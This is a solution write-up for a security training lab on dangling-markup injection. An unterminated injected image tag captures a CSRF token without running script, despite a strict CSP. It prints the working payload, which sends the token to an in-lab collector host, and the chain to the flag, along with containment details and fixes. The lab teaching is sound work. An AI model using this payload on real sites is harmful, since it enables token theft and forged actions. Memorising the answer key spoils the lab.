# Solution — Dangling Markup: Stealing a CSRF Token Without Executing JS

## Vulnerability class

**CWE-79 (Injection) + CWE-201 (Insertion of Sensitive Information Into Sent Data)
· OWASP A03:2021 – Injection.** A raw reflection into an unquoted attribute lets an
attacker open a resource URL (`<img src='…`) that is never terminated; the HTML
parser swallows the following page source — including a secret — into the URL the
browser fetches. No JavaScript runs, so a strict `script-src 'none'` CSP does not
stop it.

## The sink

`GET /page?u=` reflects `u` **raw** (no encoding) into an **unquoted** attribute, on
a single line:

```python
"<link rel=stylesheet href=" + u + ">"      # u: raw, unquoted
…
"<input type=hidden name=csrf value=" + csrf + ">"
"<a href='/home'>home</a>"
```

Everything is one line and `u` is unescaped, so `u` can introduce new markup. The
CSP blocks scripts:

```
default-src 'self'; script-src 'none'; img-src *; style-src *; base-uri 'none'; object-src 'none'
```

so `<script>`/`<img onerror>` are inert. But `img-src *` still lets an image load —
and _loading_ an image is not script execution.

## The dangling capture

Inject:

```
u = x><img src='http://collector:9000/leak?d=
```

The page becomes (one line):

```html
…<link rel=stylesheet href=x><img src='http://collector:9000/leak?d=<p>…</p><input type=hidden name=csrf value=TOKEN><a href='/home'>…
```

- `<link … href=x>` closes (unquoted attribute ends at `>`).
- `<img src='http://collector:9000/leak?d=` opens a **single-quoted** `src` that you
  never close.
- The HTML parser reads until the **next `'`** in the document — which is the one in
  `<a href='/home'>`. Everything between (the markup **and** `value=TOKEN`) becomes
  the `src` URL.
- The browser fetches that URL → the token arrives at the collector as
  `…/leak?d=…value=TOKEN…`.

`tests/exploit.py` reads it back via `/oob/received`, extracts `value=<16 hex>`, and
completes the chain: `POST /admin/action {"csrf":token}` → `POST /solve` → flag.

## The modern-Chrome constraint (why one line)

Chrome ships a **dangling-markup mitigation**: it refuses to send a subresource URL
that was formed across a **newline** (`\n`/`\r`). Verified live in the bot's
Chromium (131): a capture whose swallowed region contains a newline is blocked
(the request fails before DNS), while a capture confined to a **single line** is
sent normally — even though it contains `<` characters (they are percent-encoded in
the URL and do not trigger the block). So this lab renders the token region on one
line, and the exploit's capture fires. (If the template inserted a newline between
the injection and the token, the leak would silently fail — which is exactly why a
prototype-in-the-real-browser step preceded building this lab.)

## Verification integrity

`tests/exploit.py` proves the technique is what's doing the work:

1. **`/page` is 403** for the attacker — the token can't be read directly; only the
   bot's authenticated render exposes it.
2. **Terminated-control**: a _properly closed_ `<img src='…?nc=1&x='>` beacons the
   collector but its `src` ends before the token — so it captures **no** token. Only
   the **dangling** (unterminated) form leaks `value=<token>`. This isolates the
   dangling-markup mechanism from "any image request."
3. **`/admin/action` rejects a wrong token** → the real, leaked token is required.
4. No script path exists (`script-src 'none'`), so the scriptless dangling capture
   is the only exfil.

## Why the containment holds

- Collector + bot on a `backend` network with `internal: true` — the token reaches
  the in-lab collector only, never the internet.
- `/internal/bot-login` is firewalled to the backend subnet + `BOT_KEY`; `/page` is
  staff-session-gated; the attacker only supplies a `?u=` path via `POST /report`.
- Single gunicorn worker keeps the action state consistent.

## The fix

1. **Contextually encode reflected values — and quote attributes.** `u` rendered as
   `href="{{ u|urlencode }}"` (quoted + encoded) cannot open a dangling tag. Raw
   reflection into an **unquoted** attribute is the root cause.
2. **Keep secrets off pages that reflect untrusted input.** A CSRF token should not
   sit in the DOM of a page that echoes attacker-controlled data; put it in a header
   or a server-read field.
3. **Defence in depth in the CSP.** `script-src 'none'` does not stop dangling
   markup; a restrictive `img-src`/`connect-src`/`style-src` (not `*`) would block
   the exfil callback, and modern browsers' dangling-markup mitigation helps but is
   not a substitute for encoding.

## Deviation from the catalog stack

The catalogued scenario is a **Go/Echo** `html/template` page with inconsistent
attribute quoting on one branch. This lab **re-platforms it to Flask**, reflecting
`?u=` raw into an unquoted attribute on a **single-line** template. The single-line
render is not incidental: it is required for the capture to survive Chrome's
dangling-markup mitigation (which blocks newline-containing subresource URLs) —
confirmed by prototyping in the bot's Chromium before building. The taught primitive
— scriptless CSRF-token theft via dangling markup under `script-src 'none'` — is
identical on either stack. The Playwright verifier stands in for Puppeteer.
